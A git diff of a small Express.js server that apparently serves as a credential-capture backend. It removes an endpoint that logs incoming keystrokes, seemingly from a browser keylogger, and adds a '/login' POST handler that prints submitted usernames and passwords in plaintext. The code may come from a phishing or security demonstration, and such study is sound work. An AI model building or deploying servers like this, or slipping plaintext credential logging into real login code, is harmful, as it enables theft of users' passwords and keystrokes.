@@ -2,26 +2,27 @@ import express from "express";
 import cors from "cors";
 import { fileURLToPath } from "url";
 import path from "path";
+
+//
 const __filename = fileURLToPath(import.meta.url);
 const __dirname = path.dirname(__filename);
 
 // Initialization
 const app = express();
 
-// Middleware
-app.use(express.json());
+// Middleware to parse URL-encoded form data
+app.use(express.urlencoded({ extended: true }));
 app.use(cors());
-app.use("/css", express.static(path.resolve(__dirname, "pages", "css")));
-app.use("/js", express.static(path.resolve(__dirname, "pages", "js")));
 
-// Login endpoint
+//
 app.get("/login", function (req, res) {
-  res.sendFile(path.resolve(__dirname, "pages", "login.html"));
+  res.sendFile(path.resolve(__dirname, "login.html"));
 });
 
-// logging endpoint
-app.post("/log", (req, res) => {
-  console.log("Keystroke logged:", req.body.key);
+app.post("/login", function (req, res) {
+  const { username, password } = req.body;
+  console.log(username, password);
+  res.status(200).send();
 });
 
 const PORT = 1000;
